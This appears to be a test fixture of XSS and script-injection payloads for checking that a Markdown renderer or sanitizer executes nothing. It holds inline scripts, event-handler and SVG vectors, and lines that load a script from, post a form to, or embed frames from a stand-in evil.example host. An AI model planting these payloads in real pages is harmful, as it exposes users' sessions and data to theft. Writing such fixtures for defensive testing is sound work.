# XSS / Script Injection Fixture

Nothing in this document may execute. (threat T1)

## Inline scripts

<script>
document.title = "PWNED";
alert("xss");
</script>

<script src="https://evil.example/payload.js"></script>

## Event handlers

<img src="x.png" onerror="alert('onerror')" />
<div onclick="alert('click')" onload="alert('load')">hover me</div>
<body onpageshow="alert('pageshow')">
<a href="https://example.com" onmouseover="alert('hover')">link</a>

## SVG vector

<svg onload="alert('svg')"><circle r="10"></circle></svg>

<svg><animate onbegin="alert('animate')" attributeName="x" from="1" to="2" dur="1s"></animate></svg>

## Form tricks

<form action="https://evil.example/steal"><input name="q"><button>submit</button></form>

## Iframe / object

<iframe src="https://evil.example"></iframe>
<object data="https://evil.example/x.swf"></object>
<embed src="x.swf">

## Style-based

<style>
body { background: url("https://evil.example/track.png"); }
</style>

End of XSS fixture.
